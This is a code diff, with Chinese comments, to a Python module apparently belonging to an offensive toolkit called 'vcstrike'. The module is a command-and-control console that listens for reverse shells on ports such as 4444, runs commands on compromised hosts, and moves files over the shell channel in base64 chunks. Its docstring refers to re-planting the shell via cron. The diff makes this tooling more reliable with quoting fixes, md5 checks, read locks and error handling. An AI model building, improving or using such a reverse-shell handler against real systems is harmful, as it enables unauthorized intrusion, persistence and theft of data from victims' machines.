@@ -6,15 +6,20 @@
 的 cron 触发），断线不自动重连；重连 = 重新植入（见 plant_revshell）。
 
 用法（CLI）：
-    vcsuite listen --ports 4444,8443
-    vcsuite revshell <host> --lhost <ip> --lport 4444
+    python -m vcstrike listen --ports 4444,8443
+    python -m vcstrike revshell <host> --lhost <ip> --lport 4444
 
-REPL 命令：help / sessions / use <id> / back / close <id> /
-           exec <cmd>（当前会话执行并回显）/
-           upload <local> <remote> / download <remote> <local> / exit
+REPL 命令（均带会话 id）：help / sessions / listeners / use <id> / back /
+    close <id> / exec <id> <cmd> / upload <id> <local> <remote> /
+    download <id> <remote> <local> / exit
+    会话直通模式下其他输入转发 shell；exit 返回 c2>，顶层 exit 退出控制台。
+    命令名是保留字：要在目标上执行同名命令请用 exec <id> <cmd>。
 """
 import base64
+import hashlib
 import os
+import re
+import shlex
 import socket
 import threading
 import time
@@ -35,6 +40,7 @@ class Session:
         self.alive = True
         self._log = on_log
         self._lock = threading.Lock()
+        self._recv_lock = threading.Lock()   # 串行化读取（防 exec/probe/传输并发混流）
         self.name = ""
 
     def send_line(self, cmd):
@@ -43,7 +49,11 @@ class Session:
             self.last_seen = time.time()
 
     def read_until_quiet(self, quiet=1.2, maxwait=12):
-        """读取输出直到静默 quiet 秒或超过 maxwait。"""
+        """读取输出直到静默 quiet 秒或超过 maxwait（持读锁，防并发混流）。"""
+        with self._recv_lock:
+            return self._read_until_quiet_locked(quiet, maxwait)
+
+    def _read_until_quiet_locked(self, quiet, maxwait):
         buf = b""
         self.conn.settimeout(quiet)
         deadline = time.time() + maxwait
@@ -131,12 +141,12 @@ class SessionManager:
         with self._lock:
             return list(self.sessions.values())
 
-    def exec(self, sid, cmd, timeout=12):
+    def exec(self, sid, cmd, timeout=12, quiet=1.2):
         s = self.get(sid)
         if not s or not s.alive:
             raise RuntimeError("会话 #%s 不存在或已断开" % sid)
         s.send_line(cmd)
-        return s.read_until_quiet(maxwait=timeout)
+        return s.read_until_quiet(quiet=quiet, maxwait=timeout)
 
     def close(self, sid):
         s = self.get(sid)
@@ -147,21 +157,28 @@ class SessionManager:
             self._log("[i] 会话 #%d 已关闭" % sid)
 
     # ---- 文件传输（经 shell 通道，base64 分块） ----
-    def upload(self, sid, local, remote, chunk=3072, progress=None):
-        data = open(local, "rb").read()
-        total = (len(data) + chunk - 1) // chunk
-        self.exec(sid, "rm -f %s" % remote, timeout=4)
+    def upload(self, sid, local, remote, chunk=8192, progress=None):
+        with open(local, "rb") as f:
+            data = f.read()
+        total = max(1, (len(data) + chunk - 1) // chunk)
+        rq = "'%s'" % remote.replace("'", "'\\''")   # 远端路径引号安全
+        self.exec(sid, "rm -f -- %s" % rq, timeout=4, quiet=0.4)
         for i in range(0, len(data), chunk):
             b64 = base64.b64encode(data[i:i + chunk]).decode()
-            self.exec(sid, "printf %%s %s | base64 -d >> %s" % (b64, remote),
-                      timeout=15)
+            self.exec(sid, "printf %%s %s | base64 -d >> %s" % (b64, rq),
+                      timeout=20, quiet=0.4)
             if progress:
                 progress(i // chunk + 1, total)
-        out = self.exec(sid, "ls -la %s && md5sum %s" % (remote, remote))
-        return out
+        out = self.exec(sid, "md5sum %s" % rq, timeout=15)
+        local_md5 = hashlib.md5(data).hexdigest()
+        m = re.search(r"([0-9a-f]{32})", out)
+        if not m or m.group(1) != local_md5:
+            raise RuntimeError("上传校验失败（远端 md5 不匹配）：%s" % out.strip()[:120])
+        return "上传完成，md5 校验一致（%s）" % local_md5
 
-    def download(self, sid, remote, local):
-        out = self.exec(sid, "base64 -w0 %s 2>&1" % remote, timeout=30)
+    def download(self, sid, remote, local, timeout=60):
+        rq = "'%s'" % remote.replace("'", "'\\''")
+        out = self.exec(sid, "base64 -w0 %s 2>&1" % rq, timeout=timeout, quiet=2.0)
         lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
         cand = ""
         for ln in reversed(lines):
@@ -170,7 +187,11 @@ class SessionManager:
                 break
         if not cand:
             raise RuntimeError("未取到有效 base64 输出：%s" % out[:200])
-        data = base64.b64decode(cand)
+        try:
+            data = base64.b64decode(cand, validate=True)
+        except Exception as e:
+            raise RuntimeError(
+                "base64 解码失败（输出可能被截断；大文件请先 gzip 或增大超时）：%s" % e)
         os.makedirs(os.path.dirname(os.path.abspath(local)), exist_ok=True)
         with open(local, "wb") as f:
             f.write(data)
@@ -187,16 +208,18 @@ class SessionManager:
 
 
 HELP_TEXT = """\
-可用命令：
-  help                       本帮助
-  sessions                   列出会话
-  use <id> / back           进入/退出会话交互（原始 shell 直通）
-  exec <id> <cmd...>         在会话执行命令并回显
-  upload <id> <local> <remote>   上传本地文件到目标
-  download <id> <remote> <local> 下载目标文件到本地
-  close <id>                 关闭会话
-  listeners                  查看监听端口
-  exit                       退出（不断开已建会话的进程，仅停止本控制台）
+可用命令（命令名为保留字；会话内要执行同名 shell 命令请用 exec <id> ...）：
+  help                            本帮助
+  sessions                        列出会话
+  listeners                       查看监听端口
+  use <id> / back                 进入/退出会话直通（原始 shell）
+  exec <id> <cmd...>              在会话执行命令并回显
+  upload <id> <local> <remote>    上传（md5 自动校验；路径含空格请加引号）
+  download <id> <remote> <local>  下载（base64 校验；大文件建议先 gzip）
+  close <id>                      关闭会话
+  exit                            会话直通中返回 c2>；顶层退出控制台
+提示：长时间无输出的命令（sleep/dd 等）会被静默判定提前返回；
+      download 单次读回受超时限制，超大文件先压缩。
 """
 
 
@@ -216,6 +239,10 @@ def interactive_loop(mgr, stdin=None):
         parts = line.split()
         cmd = parts[0].lower()
         if cmd in ("exit", "quit"):
+            if cur is not None and cmd == "exit":
+                cur = None
+                print("[i] 返回 c2> 控制台（退出整个控制台请先 back）")
+                continue
             break
         elif cmd == "help":
             print(HELP_TEXT)
@@ -249,28 +276,45 @@ def interactive_loop(mgr, stdin=None):
             except (IndexError, ValueError):
                 print("[-] 用法: exec <id> <cmd>")
                 continue
-            print(mgr.exec(sid, rest))
+            try:
+                print(mgr.exec(sid, rest))
+            except (RuntimeError, OSError) as e:
+                print("[-] %s" % e)
         elif cmd == "upload":
             try:
-                sid = int(parts[1]); local, remote = parts[2], parts[3]
+                sid = int(parts[1])
+                toks = shlex.split(line.split(None, 3)[3])
+                local, remote = toks[0], toks[1]
             except (IndexError, ValueError):
-                print("[-] 用法: upload <id> <local> <remote>")
+                print("[-] 用法: upload <id> <local> <remote>（路径含空格加引号）")
                 continue
-            print(mgr.upload(sid, local, remote,
-                             progress=lambda i, t: print("  [%.0f%%]" % (i * 100.0 / t))))
+            try:
+                mgr.upload(sid, local, remote,
+                           progress=lambda i, t: print("  [%.0f%%]" % (i * 100.0 / t)))
+            except (RuntimeError, OSError) as e:
+                print("[-] %s" % e)
         elif cmd == "download":
             try:
-                sid = int(parts[1]); remote, local = parts[2], parts[3]
+                sid = int(parts[1])
+                toks = shlex.split(line.split(None, 3)[3])
+                remote, local = toks[0], toks[1]
             except (IndexError, ValueError):
-                print("[-] 用法: download <id> <remote> <local>")
+                print("[-] 用法: download <id> <remote> <local>（路径含空格加引号）")
                 continue
             try:
                 print(mgr.download(sid, remote, local))
-            except Exception as e:
+            except (RuntimeError, OSError) as e:
                 print("[-] %s" % e)
         elif cur is not None:
-            # 会话直通模式
-            out = mgr.exec(cur.id, line)
+            # 会话直通模式（顶层保留字已在前面分支处理）
+            try:
+                out = mgr.exec(cur.id, line)
+            except (RuntimeError, OSError) as e:
+                print("[-] %s" % e)
+                if not cur.alive:
+                    print("[!] 会话已断开")
+                    cur = None
+                continue
             print(out, end="" if out.endswith("\n") else "\n")
             if not cur.alive:
                 print("[!] 会话已断开")
